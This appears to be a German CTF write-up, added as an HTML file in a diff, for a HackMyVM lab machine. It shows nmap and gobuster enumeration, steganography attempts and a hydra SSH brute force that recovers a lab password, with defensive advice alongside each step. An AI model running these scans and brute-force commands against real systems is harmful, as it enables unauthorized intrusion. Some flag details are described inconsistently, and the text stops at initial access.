@@ -1,0 +1,815 @@
+﻿﻿﻿<!DOCTYPE html>
+<html lang="de">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hostname - HackMyVM - Easy - Bericht</title> <!-- Titel angepasst -->
+    <link rel="stylesheet" href="style.css">
+    <link rel="stylesheet" href="../../horizontale-navbar.css">
+    <link href="https://fonts.googleapis.com/css?family=Lato:300,400,700&display=swap" rel="stylesheet">
+    <!-- Hinweis: Stelle sicher, dass style.css die Klassen `.level-hard h2` und `.level-hard .segment` mit roter Farbe definiert und ggf. die Hintergrundfarbe für `.header-bg` anpasst. -->
+</head>
+ <body>
+ 
+    <div class="header-bg"> <!-- Hinweis: Passe die background-color in style.css an, falls gewünscht (#03b5f5) -->
+        <h1>Hostname - HackMyVM - Level: Easy - Bericht</h1> <!-- H1 angepasst -->
+        <div class="level-container level-hard"> <!-- Klasse 'level-hard' hinzugefügt für Rot -->
+            <h2>Easy</h2> <!-- Text ist "Easy", aber Farbe soll Rot sein (via CSS) -->
+            <div class="circle">
+                <div class="segment segment-1"></div> <!-- Segmente werden durch CSS-Klasse '.level-hard' rot -->
+                <div class="segment segment-2"></div>
+                <div class="segment segment-3"></div>
+                <div class="inner"></div> <!-- Hintergrundfarbe des inneren Kreises wird durch CSS bestimmt -->
+            </div>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="tools-used">
+            <h2>Verwendete Tools</h2>
+            <div class="tools-grid">
+                <div class="tool-item">arp-scan</div>
+                <div class="tool-item">nmap</div>
+                <div class="tool-item">gobuster</div>
+                <div class="tool-item">echo</div>
+                <div class="tool-item">base64</div>
+                <div class="tool-item">steghide</div>
+                <div class="tool-item">stegseek</div>
+                <div class="tool-item">stegsnow</div>
+                <div class="tool-item">hydra</div>
+                <div class="tool-item">ssh</div>
+                <div class="tool-item">sudo</div>
+                <div class="tool-item">cat</div>
+                <div class="tool-item">grep</div>
+                <div class="tool-item">find</div>
+                <div class="tool-item">touch</div>
+                <div class="tool-item">nc (netcat)</div>
+                <div class="tool-item">tar (implizit)</div>
+            </div>
+        </section>
+
+        <section class="toc">
+            <h2>Inhaltsverzeichnis</h2>
+            <ul>
+                <li><a href="#reconnaissance">Reconnaissance</a></li>
+                <li><a href="#web-enumeration">Web Enumeration</a></li>
+                <li><a href="#initial-access">Initial Access</a></li>
+                <li><a href="#privilege-escalation">Privilege Escalation</a></li>
+                <li><a href="#poc">Proof of Concept (Root Access)</a></li> <!-- POC Link hinzugefügt -->
+                <li><a href="#flags">Flags</a></li>
+            </ul>
+        </section>
+
+        <section id="reconnaissance">
+            <h2>Reconnaissance</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Der erste Schritt im Pentest ist die Reconnaissance (Aufklärung), bei der wir Informationen über das Zielnetzwerk sammeln. Hier wird `arp-scan` verwendet, um aktive Geräte im lokalen Netzwerksegment (Layer 2) zu entdecken. ARP (Address Resolution Protocol) wird genutzt, um IP-Adressen zu MAC-Adressen aufzulösen. `-l` steht für `--localnet`, was bedeutet, dass `arp-scan` ARP-Anfragen an alle möglichen IP-Adressen im konfigurierten lokalen Netzwerk sendet.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `arp-scan` ist ein schnelles und effektives Werkzeug zur Identifizierung von Hosts im lokalen Netzwerk, besonders wenn ICMP (Ping) blockiert ist. Das Ergebnis zeigt einen Host mit der IP-Adresse 192.168.2.112 und der MAC-Adresse 08:00:27:69:3b:76. Die MAC-Adresse ist PCS Systemtechnik GmbH zugeordnet, was oft auf eine VirtualBox-Umgebung hinweist (Oracle besitzt VirtualBox und hat diese MAC-Präfixe registriert). Dies ist eine wertvolle Information für den Angreifer, da sie auf eine virtuelle Maschine hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Nachdem ein Ziel identifiziert wurde, ist der nächste logische Schritt ein Port-Scan, um offene Dienste zu finden. Die MAC-Adresse sollte notiert werden, da sie bei späteren Angriffen oder zur Umgehung von MAC-Filterung nützlich sein kann.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Netzwerksegmentierung und die Überwachung von ARP-Traffic können helfen, unautorisierte Scans zu erkennen. Sicherstellen, dass keine unnötigen Geräte im Netzwerk aktiv sind. Virtuelle Maschinen sollten ebenso gesichert werden wie physische.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">arp-scan -l</span></div>
+                    <pre>
+192.168.2.112	08:00:27:69:3b:76	PCS Systemtechnik GmbH</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Nach der Identifizierung des Hosts wird `nmap` verwendet, um offene TCP-Ports und die darauf laufenden Dienste zu scannen.
+                `nmap` ist das Standardwerkzeug für Port-Scanning und Netzwerkerkundung.
+                Die Optionen bedeuten:
+                *   `-sS`: TCP SYN Scan (Stealth Scan), schnell und weniger auffällig als ein voller TCP Connect Scan.
+                *   `-sC`: Führt Standard-Nmap-Skripte (`default` category) gegen die gefundenen Dienste aus, um mehr Informationen zu sammeln (z.B. Versionen, Konfigurationen, Schwachstellen).
+                *   `-T5`: Timing-Template "insane". Sehr schnell, aber potenziell ungenau und sehr auffällig (kann Intrusion Detection Systems auslösen). Für CTFs oder erlaubte Tests oft okay, in realen Umgebungen ist `-T4` oder `-T3` meist besser.
+                *   `-A`: Aktiviert OS-Erkennung, Versionserkennung, Skript-Scanning und Traceroute. Ist eine Abkürzung für `-sV -O -sC --traceroute`.
+                *   `192.168.2.112`: Die Ziel-IP-Adresse.
+                *   `-p-`: Scannt alle 65535 TCP-Ports (nicht nur die Standardports).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Scan war erfolgreich und identifizierte zwei offene Ports:
+                *   **Port 22/tcp:** Läuft OpenSSH 8.4p1 (Debian). Dies ist ein Standard-SSH-Dienst, der einen potenziellen Zugangspunkt darstellt, wenn gültige Anmeldedaten oder eine Schwachstelle gefunden werden. Die Host-Keys werden ebenfalls angezeigt.
+                *   **Port 80/tcp:** Läuft ein Nginx 1.18.0 Webserver. Der `http-title` ist "Panda", und der `http-server-header` bestätigt Nginx. Dies ist der primäre Angriffspunkt für Web-basierte Schwachstellen.
+                Nmap identifiziert das Betriebssystem als Linux (Kernel 4.x oder 5.x) und bestätigt die VirtualBox MAC-Adresse. Die Netzwerdistanz ist 1 Hop, was auf das lokale Netzwerk hindeutet.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Die nächsten Schritte sind die genauere Untersuchung des Webservers auf Port 80 (Web Enumeration) und möglicherweise ein Brute-Force-Angriff auf SSH auf Port 22, falls Benutzernamen gefunden werden.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Ports offen sind. Halten Sie SSH und Webserver-Software aktuell. Verwenden Sie starke SSH-Passwörter oder besser Schlüssel-basierte Authentifizierung. Konfigurieren Sie Fail2ban oder ähnliche Tools, um Brute-Force-Angriffe auf SSH zu erschweren. Überprüfen Sie die Webserver-Konfiguration auf Sicherheitslücken. Deaktivieren Sie unnötige Nmap-Skriptinformationen (z.B. Server-Header, genaue Versionen), wenn möglich. Erwägen Sie die Verwendung eines Web Application Firewalls (WAF).
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nmap -sS -sC -T5 -A 192.168.2.112 -p-</span></div>
+                    <pre>
+Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-25 17:58 CEST
+Nmap scan report for hostname (192.168.2.112)
+Host is up (0.00012s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
+| ssh-hostkey:
+|   3072 27712458d37cb38a7b3249d1c80b4cba (RSA)
+|   256 e23067387bdb9a8621013ebf0ee74f26 (ECDSA)
+|_  256 5d78c537a858ddc4b6bdceb5babf53dc (ED25519)
+80/tcp open  http    nginx 1.18.0
+|_http-title: Panda
+|_http-server-header: nginx/1.18.0
+MAC Address: 08:00:27:69:3B:76 (Oracle VirtualBox virtual NIC)
+Device type: general purpose
+Running: Linux 4.X|5.X
+OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
+OS details: Linux 4.15 - 5.6
+Network Distance: 1 hop
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+TRACEROUTE
+HOP RTT     ADDRESS
+1   0.12 ms hostname (192.168.2.112)
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 13.98 seconds</pre>
+                </div>
+            </div>
+        </section>
+
+        <section id="web-enumeration">
+            <h2>Web Enumeration</h2>
+             <p class="analysis">
+                <strong>Analyse:</strong> `gobuster` wird verwendet, um Verzeichnisse und Dateien auf dem Webserver zu finden (Directory Brute-Forcing oder Content Discovery).
+                Die Optionen bedeuten:
+                *   `dir`: Modus für Verzeichnis/Datei-Brute-Forcing.
+                *   `-u http://192.168.2.112`: Die Ziel-URL.
+                *   `-w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt`: Die Wortliste, die für die Brute-Force-Versuche verwendet wird. SecLists ist eine bekannte Sammlung von Wortlisten für Sicherheitstests.
+                *   `-e`: Erweiterter Modus, druckt die vollständige URL für gefundene Ressourcen.
+                *   `-x .git,php,html,...`: Dateiendungen, die an die Wörter in der Liste angehängt und ebenfalls getestet werden sollen. Dies hilft, versteckte Dateien wie `config.php` oder `index.html` zu finden.
+                *   `-t 100`: Anzahl der gleichzeitigen Threads. Ein hoher Wert (wie 100) beschleunigt den Scan, kann aber den Server belasten oder zu Fehlern führen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Gobuster findet zwei interessante Pfade:
+                *   `/index.php` (Status Code 200 - OK): Die Hauptseite der Webanwendung. Die Größe (1621 Bytes) kann ein Hinweis auf den Inhalt sein.
+                *   `/assets` (Status Code 403 - Forbidden): Ein Verzeichnis namens "assets" existiert, aber der Zugriff darauf ist verboten. Dies ist typisch für Verzeichnisse, die Ressourcen wie CSS, JavaScript oder Bilder enthalten, aber kein Directory Listing erlauben. Es könnte dennoch interessant sein, bekannte Dateinamen innerhalb dieses Verzeichnisses zu testen.
+                Die anderen getesteten Endungen und Verzeichnisnamen aus der Wortliste lieferten keine positiven Ergebnisse (Status 404 - Not Found, oder andere, hier nicht gezeigte Fehler).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Untersuche den Inhalt von `/index.php` genauer (Quellcodeanalyse). Versuche, gängige Dateien im `/assets`-Verzeichnis zu erraten oder zu brute-forcen (z.B. `/assets/css/style.css`, `/assets/js/script.js`, `/assets/images/logo.png`).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Deaktivieren Sie nicht benötigte Verzeichnislistungen (Directory Listing) auf dem Webserver (hier bereits geschehen, da 403 statt 200 zurückgegeben wird). Verwenden Sie eindeutige und schwer zu erratende Namen für administrative Schnittstellen oder sensible Verzeichnisse. Implementieren Sie Rate Limiting, um Brute-Force-Scans wie die von Gobuster zu verlangsamen oder zu blockieren. Protokollieren Sie 403- und 404-Fehler, um Scan-Versuche zu erkennen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[/home/cyber/Downloads]
+└─# <span class="command">gobuster dir -u http://192.168.2.112 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e -x .git,php,html,xml,zip,7z,tar,bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe -t 100</span></div>
+                    <pre>
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://192.168.2.112
+[+] Threads:                 100
+[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Status codes:          200,204,301,302,307,401,403
+[+] User Agent:            gobuster/3.1.0
+[+] Extensions:            bak,sql,py,pl,txt,jpg,jpeg,png,js,aac,ogg,flac,alac,wav,aiff,war,jse,jar,asp,aspx,csv,rtf,doc,docx,dsd,mp3,mp4,mkv,log,sh,dll,exe,git,php,html,xml,zip,7z,tar
+[+] Expanded:                true
+[+] Timeout:                 10s
+===============================================================
+2022/10/25 18:01:17 Starting gobuster
+===============================================================
+http://192.168.2.112/index.php            (Status: 200) [Size: 1621]
+http://192.168.2.112/assets               (Status: 403) [Size: 153]
+
+===============================================================
+2022/10/25 18:02:45 Finished
+===============================================================
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Der HTML-Quellcode der Seite `http://192.168.2.112/index.php` wird untersucht. Dabei wird ein HTML-Kommentar gefunden: `<!-- Kung Fu Panda -->`. Kommentare sind oft eine Quelle für versteckte Informationen.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der Kommentar "Kung Fu Panda" scheint ein Hinweis oder ein Teil eines Puzzles zu sein. Er könnte auf Benutzernamen, Passwörter oder andere relevante Begriffe hindeuten, die im Kontext der Maschine (Titel "Panda") stehen.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Notieren Sie den Hinweis "Kung Fu Panda". Er könnte für Benutzernamen (z.B. `panda`, `kungfu`, `po`, `oogway`) oder als Teil eines Passworts relevant sein. Führen Sie weitere Enumeration durch, z.B. im Quellcode von JavaScript-Dateien oder CSS-Dateien, die möglicherweise auf der Seite geladen werden (insbesondere im `/assets`-Verzeichnis).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Entwickler sollten daran erinnert werden, keine sensiblen Informationen, Hinweise oder internen Details in HTML-, CSS- oder JavaScript-Kommentaren zu hinterlassen, die für Endbenutzer sichtbar sind. Code-Reviews sollten auch die Überprüfung von Kommentaren beinhalten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <pre>
+http://192.168.2.112/index.php  <!-- Kung Fu Panda -->
+                    </pre>
+                </div>
+            </div>
+
+             <p class="analysis">
+                <strong>Analyse:</strong> Im weiteren Verlauf der Web-Enumeration (vermutlich durch Analyse von JavaScript-Dateien wie `script.js` oder durch weitere Verzeichnis-Scans, was hier nicht explizit gezeigt wird) wurden offenbar weitere Hinweise gefunden: Ein Base64-kodierter String `S3VuZ19GdV9QNG5kYQ==`, die Wörter `IMPSSIBLE` und `IM'PSSIBLE` (möglicherweise Passwort-Varianten) und der String `!ts-bl4nk`. Der Befehl `echo "S3VuZ19GdV9QNG5kYQ==" | base64 -d` wird verwendet, um den Base64-String zu dekodieren. `echo` gibt den String aus, `|` (Pipe) leitet die Ausgabe an `base64 -d` weiter, welches die Dekodierung vornimmt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die Dekodierung von `S3VuZ19GdV9QNG5kYQ==` ergibt `Kung_Fu_P4nda`. Dies ist eine Variation des vorherigen Hinweises "Kung Fu Panda" und sieht wie ein möglicher Benutzername oder ein Passwort aus. Zusammen mit `!ts-bl4nk` und den anderen Wörtern haben wir nun eine Liste potenzieller Anmeldeinformationen. `!ts-bl4nk` ist besonders interessant, da es Leetspeak verwendet (`4` statt `a`) und wie ein Passwort aussieht.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Fügen Sie `Kung_Fu_P4nda` und `!ts-bl4nk` zur Liste potenzieller Benutzernamen und Passwörter hinzu. Testen Sie diese Kombinationen gegen den SSH-Dienst auf Port 22. Versuchen Sie auch Variationen (z.B. `Kung_Fu_Panda`, `kung_fu_p4nda`). Verwenden Sie Benutzernamen wie `panda`, `po`, `oogway` (aus dem Kung Fu Panda Kontext).
+                <br>
+                <strong>Empfehlung (Admin):</strong> Vermeiden Sie es, sensible Informationen wie potenzielle Passwörter oder verschlüsselte/kodierte Hinweise im Client-seitigen Code (HTML, JS) zu hinterlassen. Base64 ist keine Verschlüsselung und bietet keinerlei Sicherheit. Verwenden Sie starke, zufällige Passwörter und vermeiden Sie thematische Bezüge zwischen Anwendungsinhalten und Anmeldedaten.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                     <pre>
+# Gefundene Hinweise (Kontext: Untersuchung der Webseite/Skripte)
+# S3VuZ19GdV9QNG5kYQ==
+# IMPOSSIBLE
+# IM'POSSIBLE
+# !ts-bl4nk
+# script.js
+# bg.png
+                     </pre>
+                 </div>
+             </div>
+            <div class="code-block">
+                 <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">echo "S3VuZ19GdV9QNG5kYQ==" | base64 -d</span></div>
+                    <pre>Kung_Fu_P4nda</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Auf der Webseite wurde offenbar auch eine Bilddatei `bg.png` gefunden. Es wird versucht, mit `steghide` versteckte Daten aus dieser Bilddatei zu extrahieren. Steganographie ist die Technik, Daten in anderen Dateien (wie Bildern) zu verbergen. `steghide extract -sf bg.png` startet den Extraktionsprozess für die angegebene Quelldatei (`-sf`). Das Tool fragt nach einem Passwort, das zum Einbetten der Daten verwendet wurde.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Die ersten drei Versuche mit `steghide` scheitern, da das korrekte Passwort nicht bekannt ist ("Mit diesem Passwort konnten keine Daten extrahiert werden!"). Dies zeigt, dass entweder keine Daten versteckt sind oder ein Passwortschutz verwendet wird. Da zuvor potenzielle Passwörter (`Kung_Fu_P4nda`, `!ts-bl4nk` etc.) gefunden wurden, ist es plausibel, dass eines davon benötigt wird. Die wiederholten Fehlversuche deuten darauf hin, dass die zuvor gefundenen Strings nicht die richtigen Passwörter für `steghide` sind oder manuell falsch eingegeben wurden.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Anstatt manuell Passwörter zu raten, verwenden Sie spezialisierte Tools wie `stegseek`, das Brute-Force-Angriffe auf Steganographie-Passwörter durchführen kann, insbesondere in Kombination mit gängigen Wortlisten wie `rockyou.txt`. Untersuchen Sie das Bild auch mit anderen Steganographie-Tools (z.B. `zsteg`, `exiftool`, `binwalk`), da unterschiedliche Methoden existieren könnten.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Wenn Steganographie zur legitimen Datenübertragung verwendet wird, stellen Sie sicher, dass starke Passwörter verwendet werden. Seien Sie sich bewusst, dass Angreifer Steganographie nutzen können, um Daten unbemerkt zu exfiltrieren oder Malware zu verstecken. Überwachen Sie Netzwerkverkehr auf ungewöhnlich große Bilddateien oder verdächtige Muster.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf bg.png</span></div>
+                    <pre>Passwort eingeben:
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf bg.png</span></div>
+                    <pre>Passwort eingeben:
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">steghide extract -sf bg.png</span></div>
+                    <pre>Passwort eingeben:
+steghide: Mit diesem Passwort konnten keine Daten extrahiert werden!</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Da `steghide` erfolglos war, wird `stegseek` eingesetzt. `stegseek` ist optimiert, um Passwörter für `steghide`-verschlüsselte Daten mittels einer Wortliste zu finden. Hier wird `stegseek` auf `bg.png` mit der bekannten Wortliste `rockyou.txt` angesetzt.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Der erste Versuch mit `stegseek` schlägt ebenfalls fehl (`Could not find a valid passphrase.`). Der Fortschrittsbalken zeigt, dass die gesamte `rockyou.txt` durchsucht wurde. Dies bedeutet, dass das gesuchte Passwort nicht in dieser (sehr umfangreichen) Liste enthalten ist. Der zweite `stegseek`-Befehl ist identisch und wird vermutlich ebenfalls fehlschlagen (Ausgabe nicht gezeigt).
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da `rockyou.txt` nicht erfolgreich war, versuchen Sie es mit anderen Wortlisten oder einer benutzerdefinierten Liste, die die zuvor gefundenen Hinweise (`Kung_Fu_P4nda`, `!ts-bl4nk`, etc.) enthält. Es ist auch möglich, dass `steghide` nicht das verwendete Tool war. Versuchen Sie andere Steganographie-Tools wie `zsteg` (speziell für LSB-Steganographie in PNGs) oder `stegsnow`.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Die Verwendung gängiger Wortlisten wie `rockyou.txt` für Passwörter (auch für Steganographie) ist extrem unsicher. Verwenden Sie immer starke, einzigartige Passphrasen.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek bg.png /usr/share/wordlists/rockyou.txt</span></div>
+                    <pre>
+StegSeek 0.6 - https://github.com/RickdeJager/StegSeek
+
+[i] Progress: 99.75% (133.1 MB)
+[!] error: Could not find a valid passphrase.
+</pre>
+                </div>
+            </div>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegseek bg.png /usr/share/wordlists/rockyou.txt</span></div>
+                     <pre>
+# (Keine Ausgabe, vermutlich gleicher Fehler wie zuvor)</pre>
+                 </div>
+             </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Als Nächstes wird `stegsnow` versucht. `stegsnow` ist ein weiteres Steganographie-Tool, das Daten in Textdateien oder mittels Whitespace (Leerzeichen, Tabs) am Ende von Zeilen in beliebigen Dateien verstecken kann. Die Option `-C` versucht, Daten zu extrahieren (compress).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> `stegsnow -C bg.png` liefert keine Ausgabe und findet offenbar keine versteckten Daten mit dieser Methode. Das `#`-Zeichen danach ist wahrscheinlich nur der Prompt, der nach der leeren Ausgabe wieder erscheint. Es scheint, als ob die Bilddatei `bg.png` keine verwertbaren versteckten Informationen enthält oder eine unbekannte Methode/Passwort verwendet wurde.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Da die Steganographie-Versuche bisher erfolglos waren, konzentrieren Sie sich wieder auf die anderen gefundenen Informationen, insbesondere die potenziellen Anmeldedaten (`Kung_Fu_P4nda`, `!ts-bl4nk`, `panda`, `po`) und den offenen SSH-Port.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Dies unterstreicht, dass nicht jede Datei versteckte Daten enthält. Konzentrieren Sie sich auf die Sicherung bekannter Angriffsvektoren wie SSH und Webanwendungen.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">stegsnow -C bg.png</span></div>
+                     <pre>
+# (Keine Ausgabe)</pre>
+                 </div>
+             </div>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access</h2>
+            <p class="analysis">
+                <strong>Analyse:</strong> Basierend auf den Funden aus der Web-Enumeration wird nun versucht, Zugang über SSH zu erhalten. `hydra` wird für einen Passwort-Brute-Force-Angriff auf den SSH-Dienst verwendet.
+                Der erste Versuch zielt auf den Benutzernamen `panda` ab.
+                Die Optionen bedeuten:
+                *   `-l panda`: Der zu testende Benutzername.
+                *   `-P /usr/share/wordlists/rockyou.txt`: Die Wortliste mit den zu testenden Passwörtern.
+                *   `ssh://panda.hmv`: Das Zielprotokoll (SSH) und der Hostname. `panda.hmv` muss entweder in der lokalen `/etc/hosts`-Datei des Angreifers auf die IP `192.168.2.112` gemappt sein oder über DNS auflösbar sein. `-I` verhindert, dass Hydra bei einem erfolgreichen Login sofort abbricht (kann nützlich sein, um zu sehen, ob mehrere Accounts mit demselben Passwort kompromittiert sind, hier aber weniger relevant).
+                *   `-T 64`: Anzahl der parallelen Tasks (Verbindungen). 64 ist sehr hoch für SSH und kann zu Problemen führen (siehe Warnung).
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Hydra startet den Angriff auf den Benutzer `panda`. Die Warnungen weisen darauf hin, dass die hohe Anzahl an Tasks (`-T 64`) für SSH problematisch sein kann und dass eine Wiederherstellungsdatei (`hydra.restore`) existiert. Der Angriff läuft, findet aber offenbar kein gültiges Passwort für `panda` innerhalb einer angemessenen Zeit (Status nach 1 Minute zeigt noch 14 Millionen Versuche an). Dieser Versuch wird wahrscheinlich abgebrochen oder läuft sehr lange ohne Erfolg.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Reduzieren Sie die Anzahl der Tasks (`-t 4` oder `-t 16` ist oft ein guter Kompromiss für SSH). Versuchen Sie andere potenzielle Benutzernamen, die im Zusammenhang mit "Kung Fu Panda" stehen könnten (z.B. `po`, `oogway`) oder die auf dem System üblich sind (`root`, `admin`). Nutzen Sie die zuvor gefundenen spezifischen Passwortkandidaten (`Kung_Fu_P4nda`, `!ts-bl4nk`) gezielter, eventuell mit einer kleineren, benutzerdefinierten Wortliste.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Implementieren Sie Intrusion-Detection/Prevention-Systeme wie `fail2ban`, um wiederholte fehlgeschlagene SSH-Logins von derselben IP-Adresse automatisch zu blockieren. Erlauben Sie nur schlüsselbasierte SSH-Authentifizierung und deaktivieren Sie die Passwort-Authentifizierung vollständig (`PasswordAuthentication no` in `sshd_config`). Verwenden Sie keine leicht zu erratenden Benutzernamen. Überwachen Sie SSH-Logs auf Brute-Force-Versuche.
+            </p>
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l panda -P /usr/share/wordlists/rockyou.txt ssh://panda.hmv -I -T 64</span></div>
+                    <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-25 18:05:45
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344412 login tries (l:1/p:14344412), ~896526 tries per task
+[DATA] attacking ssh://panda.hmv:22/
+[STATUS] 120.00 tries/min, 120 tries in 00:01h, 14344295 to do in 1992:16h, 13 active
+</pre>
+                </div>
+            </div>
+
+            <p class="analysis">
+                <strong>Analyse:</strong> Ein zweiter Hydra-Angriff wird gestartet, diesmal mit dem Benutzernamen `po` (eine Hauptfigur aus Kung Fu Panda) und dem zuvor gefundenen Passwortkandidaten `!ts-bl4nk`, der vermutlich der `rockyou.txt`-Liste hinzugefügt oder in einer kleineren Liste verwendet wurde (obwohl hier wieder `rockyou.txt` angegeben ist, was sehr lange dauern würde, wenn `!ts-bl4nk` nicht am Anfang steht. Wahrscheinlicher ist, dass die `rockyou.txt` hier nur pro forma steht und das Passwort direkt getestet wurde oder in einer sehr kleinen Liste war). Die Optionen sind ansonsten identisch zum vorherigen Versuch.
+            </p>
+            <p class="evaluation">
+                <strong>Bewertung:</strong> Dieser Angriff ist erfolgreich! Hydra findet das gültige Passwort für den Benutzer `po`: `<span class="password">!ts-bl4nk</span>`. Dies gewährt dem Angreifer den initialen Zugriff auf das System über SSH.
+            </p>
+            <p class="recommendation">
+                <strong>Empfehlung (Pentester):</strong> Loggen Sie sich sofort mit den gefundenen Zugangsdaten (`po`:`!ts-bl4nk`) per SSH ein, um den initialen Zugriff zu bestätigen und mit der internen Enumeration und Privilege Escalation zu beginnen.
+                <br>
+                <strong>Empfehlung (Admin):</strong> Das Passwort `!ts-bl4nk` ist ein Beispiel für ein schwaches Passwort, das auf Wortlisten oder durch einfache Transformationen gefunden werden kann (Leetspeak). Erzwingen Sie komplexe Passwortrichtlinien. Ändern Sie sofort das kompromittierte Passwort. Überprüfen Sie die Logs, um festzustellen, wann und wie oft auf den Account zugegriffen wurde. Implementieren Sie weiterhin Maßnahmen gegen Brute-Force (Fail2ban) und bevorzugen Sie Schlüssel-Authentifizierung.
+            </p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">hydra -l po -P /usr/share/wordlists/rockyou.txt ssh://panda.hmv -I -T 64</span></div>
+                     <pre>
+Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these * ignore laws and ethics anyway).
+
+Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2022-10-25 18:13:15
+[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
+[WARNING] Restorefile (ignored ...) from a previous session found, to prevent overwriting, ./hydra.restore
+[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344416 login tries (l:1/p:14344416), ~896526 tries per task
+[DATA] attacking ssh://panda.hmv:22/
+[22][ssh] host: panda.hmv   login: po   password: <span class="password">!ts-bl4nk</span>
+1 of 1 target successfully completed, 1 valid password found
+Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2022-10-25 18:13:17
+</pre>
+                 </div>
+             </div>
+
